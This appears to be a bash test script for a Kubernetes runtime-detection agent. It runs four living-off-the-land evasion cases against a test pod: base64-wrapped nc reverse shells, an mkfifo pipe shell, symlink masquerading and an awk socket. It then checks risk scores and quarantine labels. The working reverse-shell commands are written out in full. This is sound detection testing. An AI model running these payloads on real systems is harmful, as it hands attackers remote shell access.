#!/usr/bin/env bash
# =============================================================================
# ZTRE Cluster Test — Scenario 3: Living-Off-The-Land (LotL) Evasion Matrix
# Implements doc/ADVANCED_TEST_PLAN.md v1.3.0 / v1.5.0 §3.3 & §9.3
#
# Vectors evaluated on target workload (vulnerable-app):
#   3A: Base64 obfuscated reverse shell  -> Expect RED / Contained (~85.0)
#   3B: Named pipe redirection (mkfifo)   -> Expect RED / Contained via | sh sink (~70.0)
#   3C: Symlink rename masquerading       -> Untestable on BusyBox (~45.0 YELLOW, no quarantine)
#   3D: In-process awk socket (/inet/tcp) -> Untestable on BusyBox (~45.0 YELLOW, no quarantine)
#
# Requirements:
#   - Bastion has NO nc and NO ping (uses python3 listeners and ssh/kubectl probes)
#   - Inside pod: BusyBox-safe shell commands
# =============================================================================
set -uo pipefail

# ---- Directory and Environment Setup ----------------------------------------
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/../.." 2>/dev/null && pwd || pwd)"

# Source common test library if present
if [ -f "${SCRIPT_DIR}/lib/common.sh" ]; then
  # shellcheck source=/dev/null
  source "${SCRIPT_DIR}/lib/common.sh"
elif [ -f "${REPO_ROOT}/tests/cluster/lib/common.sh" ]; then
  # shellcheck source=/dev/null
  source "${REPO_ROOT}/tests/cluster/lib/common.sh"
elif [ -f "${REPO_ROOT}/lib/common.sh" ]; then
  # shellcheck source=/dev/null
  source "${REPO_ROOT}/lib/common.sh"
elif [ -f "lib/common.sh" ]; then
  # shellcheck source=/dev/null
  source "lib/common.sh"
elif [ -f "${SCRIPT_DIR}/advanced_common_setup.sh" ]; then
  # shellcheck source=/dev/null
  source "${SCRIPT_DIR}/advanced_common_setup.sh"
fi

# ---- Default Configuration (ground truth cluster values) ---------------------
NS="${NS:-ztre-test}"
AGENT_NS="${AGENT_NS:-ztre-system}"
AGENT_LABEL="${AGENT_LABEL:-app.kubernetes.io/name=ztre-agent}"
WORKER_IP="${WORKER_IP:-10.91.128.11}"
BASTION_IP="${BASTION_IP:-10.91.128.10}"
EVIDENCE_DIR="${EVIDENCE_DIR:-evidence/advanced}"
TS="${TS:-$(date +%Y%m%d-%H%M%S)}"

# Resolve EVIDENCE_DIR relative to REPO_ROOT so relative paths work from any CWD
case "$EVIDENCE_DIR" in
  /*) : ;;
  *) EVIDENCE_DIR="$REPO_ROOT/$EVIDENCE_DIR" ;;
esac
mkdir -p "$EVIDENCE_DIR"

LOG="${LOG:-$EVIDENCE_DIR/run-$TS.log}"
SCENARIO3_JSON="${SCENARIO3_JSON:-$EVIDENCE_DIR/scenario3_result-$TS.json}"

# ---- Helper Fallbacks (if not provided by lib/common.sh) ---------------------
if ! declare -F say >/dev/null 2>&1; then
  say() { echo "$*" | tee -a "$LOG"; }
fi

if ! declare -F hdr >/dev/null 2>&1; then
  hdr() { say ""; say "============================================================"; say "$*"; say "============================================================"; }
fi

if ! declare -F agent_logs >/dev/null 2>&1; then
  agent_logs() { kubectl logs -n "$AGENT_NS" -l "$AGENT_LABEL" --tail=2000 2>/dev/null || true; }
fi

if ! declare -F get_pod >/dev/null 2>&1; then
  get_pod() { kubectl get pod -n "$NS" -l "app=$1" -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || true; }
fi

if ! declare -F tcp_catcher >/dev/null 2>&1; then
  tcp_catcher() {
    python3 - "$1" "$2" "$3" <<'PY'
import socket, sys
port, out, secs = int(sys.argv[1]), sys.argv[2], float(sys.argv[3])
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", port))
s.listen(5)
s.settimeout(secs)
try:
    conn, _ = s.accept()
    conn.settimeout(secs)
    f = open(out, "wb") if out != "-" else sys.stdout.buffer
    while True:
        try:
            data = conn.recv(65536)
        except socket.timeout:
            break
        if not data:
            break
        f.write(data); f.flush()
except socket.timeout:
    pass
finally:
    try: s.close()
    except Exception: pass
PY
  }
fi

if ! declare -F reset_agent_and_wait >/dev/null 2>&1; then
  reset_agent_and_wait() {
    local target="$1"
    say "[reset] clearing quarantine label for: $target"
    kubectl label pod -n "$NS" -l "app=$target" ztre/quarantine- --overwrite >/dev/null 2>&1 || \
    kubectl label pod -n "$NS" "$target" ztre/quarantine- --overwrite >/dev/null 2>&1 || true

    say "[reset] restarting ztre-agent daemonset (clears sync.Map dedup cache)"
    kubectl rollout restart daemonset -n "$AGENT_NS" ztre-agent >/dev/null 2>&1 || true
    kubectl rollout status daemonset -n "$AGENT_NS" ztre-agent --timeout=40s >/dev/null 2>&1 || true

    local timeout=20
    while [ "$timeout" -gt 0 ]; do
      local agent_pod
      agent_pod="$(kubectl get pod -n "$AGENT_NS" -l "$AGENT_LABEL" --field-selector=status.phase=Running -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || true)"
      if [ -n "$agent_pod" ] && kubectl logs -n "$AGENT_NS" "$agent_pod" --tail=200 2>/dev/null | grep -q "Tetragon gRPC event stream established"; then
        say "[reset] agent gRPC stream confirmed open"
        break
      elif agent_logs 200 | grep -q "Tetragon gRPC event stream established"; then
        say "[reset] agent gRPC stream confirmed open"
        break
      fi
      sleep 1
      timeout=$((timeout - 1))
    done
    sleep 2
  }
fi

# ---- Scenario 3 Implementation ----------------------------------------------
run_scenario3() {
  hdr "SCENARIO 3: Living-Off-The-Land (LotL) Evasion Matrix"

  # Pre-flight tool verification (bastion has NO nc and NO ping)
  for tool in curl jq kubectl python3; do
    if ! command -v "$tool" >/dev/null 2>&1; then
      say "[FAIL] Required CLI tool missing on bastion: $tool"
      return 1 2>/dev/null || exit 1
    fi
  done

  # Worker reachability via SSH (no ping available)
  if ssh -o BatchMode=yes -o ConnectTimeout=3 node2@"$WORKER_IP" true 2>/dev/null; then
    say "[OK] worker node $WORKER_IP reachable (ssh)"
  else
    say "[WARN] ssh to worker $WORKER_IP failed; continuing (kubectl path may still work)"
  fi

  # Resolve target vulnerable-app pod
  local app_pod
  app_pod=$(get_pod vulnerable-app)
  if [ -z "$app_pod" ]; then
    say "[WARN] vulnerable-app pod not found, deploying manifest..."
    if [ -f "$REPO_ROOT/deploy/workloads/vulnerable-app.yaml" ]; then
      kubectl apply -f "$REPO_ROOT/deploy/workloads/vulnerable-app.yaml" >/dev/null 2>&1 || true
      kubectl rollout status deployment/vulnerable-app -n "$NS" --timeout=60s >/dev/null 2>&1 || true
      app_pod=$(get_pod vulnerable-app)
    fi
  fi

  if [ -z "$app_pod" ]; then
    say "[FAIL] vulnerable-app pod not found in namespace $NS"
    return 1 2>/dev/null || exit 1
  fi
  say "[info] target pod: $app_pod"

  local all_passed="true"

  # ===========================================================================
  # Sub-Scenario 3A: Base64 Wrapper (Expect RED / Contained ~85.0)
  # ===========================================================================
  say ""
  say "--- [Sub-Scenario 3A: Base64 Wrapper] ---"
  reset_agent_and_wait "$app_pod"

  pkill -f "python3.*4444" 2>/dev/null || true
  (tcp_catcher 4444 /dev/null 10 >/dev/null 2>&1 &) || true
  local listener_pid_3a=$!
  sleep 1

  local b64_payload
  b64_payload=$(printf "nc %s 4444 -e /bin/sh" "$BASTION_IP" | base64 | tr -d '\r\n')
  local cmd_3a="echo \"$b64_payload\" | base64 -d | sh"

  local t_start_3a
  t_start_3a=$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)

  say "[SC3-3A-base64] executing: $cmd_3a"
  timeout 20 kubectl exec -n "$NS" "$app_pod" -- sh -c "timeout 8 sh -c '$cmd_3a'" >/dev/null 2>&1 || true
  sleep 6

  kill "$listener_pid_3a" 2>/dev/null || true
  wait "$listener_pid_3a" 2>/dev/null || true

  # Decisive event for 3A is the decoded 'nc ... -e' reverse shell (score 85).
  # Prefer that specific binary; fall back to the max score in the window.
  local score_3a
  score_3a=$(agent_logs | jq -rR --arg p "$app_pod" --arg t "$t_start_3a" \
    'fromjson? | select(.pod == $p and (.binary|test("nc$")) and .risk_score != null and (.timestamp == null or .timestamp >= $t)) | .risk_score' 2>/dev/null | sort -n | tail -1 || true)
  [ -n "$score_3a" ] || score_3a=$(agent_logs | jq -rR --arg p "$app_pod" --arg t "$t_start_3a" \
    'fromjson? | select(.pod == $p and .risk_score != null and (.timestamp == null or .timestamp >= $t)) | .risk_score' 2>/dev/null | sort -n | tail -1 || true)

  local quar_3a
  quar_3a=$(kubectl get pod -n "$NS" "$app_pod" -o jsonpath='{.metadata.labels.ztre\/quarantine}' 2>/dev/null || true)
  say "[SC3-3A-base64] observed score: ${score_3a:-<none>}  quarantined: ${quar_3a:-no}  (expected: ~85 RED, quarantined)"

  local verdict_3a="FAIL"
  if [ "$quar_3a" = "true" ]; then
    # Corroborate the decisive (max) score in the window, not just the label.
    if [ -n "$score_3a" ] && [ "$score_3a" -ge 70 ] 2>/dev/null; then
      verdict_3a="PASS"
      say "[SC3-3A-base64] VERDICT: PASS (Contained; decisive score ${score_3a} RED)"
    else
      verdict_3a="PARTIAL"
      say "[SC3-3A-base64] VERDICT: PARTIAL (contained; RED score not corroborated, got ${score_3a:-<none>})"
    fi
  else
    all_passed="false"
    say "[SC3-3A-base64] VERDICT: FAIL (Not quarantined)"
  fi

  # ===========================================================================
  # Sub-Scenario 3B: Named Pipe Redirection (Expect RED / Contained ~70.0 via | sh)
  # ===========================================================================
  say ""
  say "--- [Sub-Scenario 3B: Named Pipe Redirection (mkfifo)] ---"
  reset_agent_and_wait "$app_pod"

  pkill -f "python3.*4444" 2>/dev/null || true
  (tcp_catcher 4444 /dev/null 10 >/dev/null 2>&1 &) || true
  local listener_pid_3b=$!
  sleep 1

  # Bound the FIFO open: pre-open a writer so "sh > /tmp/p" does not block.
  local cmd_3b="rm -f /tmp/p; mkfifo /tmp/p 2>/dev/null; (sleep 9 > /tmp/p 2>/dev/null &); (nc $BASTION_IP 4444 < /tmp/p | sh > /tmp/p 2>&1) & sleep 3; rm -f /tmp/p"

  local t_start_3b
  t_start_3b=$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)

  say "[SC3-3B-mkfifo] executing: $cmd_3b"
  timeout 20 kubectl exec -n "$NS" "$app_pod" -- sh -c "timeout 8 sh -c '$cmd_3b'" >/dev/null 2>&1 || true
  sleep 6

  kill "$listener_pid_3b" 2>/dev/null || true
  wait "$listener_pid_3b" 2>/dev/null || true

  local score_3b
  score_3b=$(agent_logs | jq -rR --arg p "$app_pod" --arg t "$t_start_3b" \
    'fromjson? | select(.pod == $p and .risk_score != null and (.timestamp == null or .timestamp >= $t)) | .risk_score' 2>/dev/null | sort -n | tail -1 || true)
  [ -n "$score_3b" ] || score_3b=$(agent_logs | jq -rR --arg p "$app_pod" \
    'fromjson? | select(.pod == $p and .risk_score != null) | .risk_score' 2>/dev/null | sort -n | tail -1 || true)

  local quar_3b
  quar_3b=$(kubectl get pod -n "$NS" "$app_pod" -o jsonpath='{.metadata.labels.ztre\/quarantine}' 2>/dev/null || true)
  say "[SC3-3B-mkfifo] observed score: ${score_3b:-<none>}  quarantined: ${quar_3b:-no}  (expected: ~70 RED, quarantined)"

  local verdict_3b="FAIL"
  if [ "$quar_3b" = "true" ]; then
    if [ -n "$score_3b" ] && [ "$score_3b" -ge 70 ] 2>/dev/null; then
      verdict_3b="PASS"
      say "[SC3-3B-mkfifo] VERDICT: PASS (Contained; decisive score ${score_3b} RED via shell sink)"
    else
      verdict_3b="PARTIAL"
      say "[SC3-3B-mkfifo] VERDICT: PARTIAL (contained; RED score not corroborated, got ${score_3b:-<none>})"
    fi
  else
    all_passed="false"
    say "[SC3-3B-mkfifo] VERDICT: FAIL (Not quarantined)"
  fi

  # ===========================================================================
  # Sub-Scenario 3C: Symlink Masquerading (Untestable on BusyBox, ~45.0, no quarantine)
  # ===========================================================================
  say ""
  say "--- [Sub-Scenario 3C: Symlink Masquerading (filepath.Base Evasion)] ---"
  reset_agent_and_wait "$app_pod"

  local cmd_3c="ln -sf /usr/bin/nc /tmp/worker; /tmp/worker $BASTION_IP 4444 -e /bin/sh || echo \"applet-not-found (expected)\""

  local t_start_3c
  t_start_3c=$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)

  say "[SC3-3C-symlink] executing: $cmd_3c"
  timeout 20 kubectl exec -n "$NS" "$app_pod" -- sh -c "timeout 8 sh -c '$cmd_3c'" >/dev/null 2>&1 || true
  sleep 6

  local score_3c
  score_3c=$(agent_logs | jq -rR --arg p "$app_pod" --arg t "$t_start_3c" \
    'fromjson? | select(.pod == $p and .risk_score != null and (.timestamp == null or .timestamp >= $t)) | .risk_score' 2>/dev/null | sort -n | tail -1 || true)
  [ -n "$score_3c" ] || score_3c=$(agent_logs | jq -rR --arg p "$app_pod" \
    'fromjson? | select(.pod == $p and .risk_score != null) | .risk_score' 2>/dev/null | sort -n | tail -1 || true)

  local quar_3c
  quar_3c=$(kubectl get pod -n "$NS" "$app_pod" -o jsonpath='{.metadata.labels.ztre\/quarantine}' 2>/dev/null || true)
  say "[SC3-3C-symlink] observed score: ${score_3c:-<none>}  quarantined: ${quar_3c:-no}  (expected: ~45 YELLOW, no quarantine)"

  local verdict_3c="FAIL"
  if [ "$quar_3c" != "true" ]; then
    verdict_3c="PASS"
    say "[SC3-3C-symlink] VERDICT: PASS (Untestable on BusyBox; not contained, score ${score_3c:-<none>} < 70)"
  else
    all_passed="false"
    say "[SC3-3C-symlink] VERDICT: FAIL (Unexpected quarantine)"
  fi

  # ===========================================================================
  # Sub-Scenario 3D: In-Process Scripting Socket / awk (Untestable on BusyBox, ~45.0)
  # ===========================================================================
  say ""
  say "--- [Sub-Scenario 3D: In-Process Scripting Socket (awk)] ---"
  reset_agent_and_wait "$app_pod"

  local cmd_3d="awk 'BEGIN{s=\"/inet/tcp/0/$BASTION_IP/4444\"; print s}' || echo \"awk-inet-unsupported (expected)\""

  local t_start_3d
  t_start_3d=$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)

  say "[SC3-3D-awk] executing: $cmd_3d"
  timeout 20 kubectl exec -n "$NS" "$app_pod" -- sh -c "timeout 8 sh -c '$cmd_3d'" >/dev/null 2>&1 || true
  sleep 6

  local score_3d
  score_3d=$(agent_logs | jq -rR --arg p "$app_pod" --arg t "$t_start_3d" \
    'fromjson? | select(.pod == $p and .risk_score != null and (.timestamp == null or .timestamp >= $t)) | .risk_score' 2>/dev/null | sort -n | tail -1 || true)
  [ -n "$score_3d" ] || score_3d=$(agent_logs | jq -rR --arg p "$app_pod" \
    'fromjson? | select(.pod == $p and .risk_score != null) | .risk_score' 2>/dev/null | sort -n | tail -1 || true)

  local quar_3d
  quar_3d=$(kubectl get pod -n "$NS" "$app_pod" -o jsonpath='{.metadata.labels.ztre\/quarantine}' 2>/dev/null || true)
  say "[SC3-3D-awk] observed score: ${score_3d:-<none>}  quarantined: ${quar_3d:-no}  (expected: ~45 YELLOW, no quarantine)"

  local verdict_3d="FAIL"
  if [ "$quar_3d" != "true" ]; then
    verdict_3d="PASS"
    say "[SC3-3D-awk] VERDICT: PASS (Untestable on BusyBox; not contained, score ${score_3d:-<none>} < 70)"
  else
    all_passed="false"
    say "[SC3-3D-awk] VERDICT: FAIL (Unexpected quarantine)"
  fi

  # ===========================================================================
  # Cleanup & Teardown for Scenario 3
  # ===========================================================================
  say ""
  say "[cleanup] clearing quarantine labels in namespace $NS"
  kubectl label pod -n "$NS" "$app_pod" ztre/quarantine- --overwrite >/dev/null 2>&1 || true
  pkill -f "python3.*4444" 2>/dev/null || true

  # ===========================================================================
  # Write JSON Result Fragment
  # ===========================================================================
  local json_file="${SCENARIO3_JSON:-$EVIDENCE_DIR/scenario3_result-$TS.json}"
  local json_canonical="$EVIDENCE_DIR/scenario3_result.json"

  jq -n \
    --arg ts "$TS" \
    --arg pod "$app_pod" \
    --arg cmd_3a "$cmd_3a" \
    --arg score_3a "${score_3a:-}" \
    --arg quar_3a "${quar_3a:-false}" \
    --arg verdict_3a "$verdict_3a" \
    --arg cmd_3b "$cmd_3b" \
    --arg score_3b "${score_3b:-}" \
    --arg quar_3b "${quar_3b:-false}" \
    --arg verdict_3b "$verdict_3b" \
    --arg cmd_3c "$cmd_3c" \
    --arg score_3c "${score_3c:-}" \
    --arg quar_3c "${quar_3c:-false}" \
    --arg verdict_3c "$verdict_3c" \
    --arg cmd_3d "$cmd_3d" \
    --arg score_3d "${score_3d:-}" \
    --arg quar_3d "${quar_3d:-false}" \
    --arg verdict_3d "$verdict_3d" \
    --arg all_passed "$all_passed" \
    '{
      timestamp: $ts,
      scenario: "scenario3_evasion",
      target_pod: $pod,
      verdict: (if $all_passed == "true" then "PASS" else "FAIL" end),
      scenario3: {
        "3A_base64": {
          name: "3A-base64",
          command: $cmd_3a,
          expected_score: 85,
          observed_score: (if $score_3a == "" then null else ($score_3a | tonumber? // $score_3a) end),
          quarantined: ($quar_3a == "true"),
          verdict: $verdict_3a
        },
        "3B_mkfifo": {
          name: "3B-mkfifo",
          command: $cmd_3b,
          expected_score: 70,
          observed_score: (if $score_3b == "" then null else ($score_3b | tonumber? // $score_3b) end),
          quarantined: ($quar_3b == "true"),
          verdict: $verdict_3b
        },
        "3C_symlink": {
          name: "3C-symlink",
          command: $cmd_3c,
          expected_score: 45,
          observed_score: (if $score_3c == "" then null else ($score_3c | tonumber? // $score_3c) end),
          quarantined: ($quar_3c == "true"),
          verdict: $verdict_3c
        },
        "3D_awk": {
          name: "3D-awk",
          command: $cmd_3d,
          expected_score: 45,
          observed_score: (if $score_3d == "" then null else ($score_3d | tonumber? // $score_3d) end),
          quarantined: ($quar_3d == "true"),
          verdict: $verdict_3d
        }
      }
    }' > "$json_file" 2>/dev/null || true

  cp -f "$json_file" "$json_canonical" 2>/dev/null || true

  say "[export] scenario3 JSON written: $json_file"
  say "[export] scenario3 log: $LOG"
  say "[SC3] LotL evasion matrix completed. Verdict: $( [ "$all_passed" = "true" ] && echo PASS || echo FAIL )"

  [ "$all_passed" = "true" ]
}

# If script executed directly rather than sourced, execute run_scenario3
if [ "${BASH_SOURCE[0]}" = "$0" ]; then
  run_scenario3 "$@"
fi
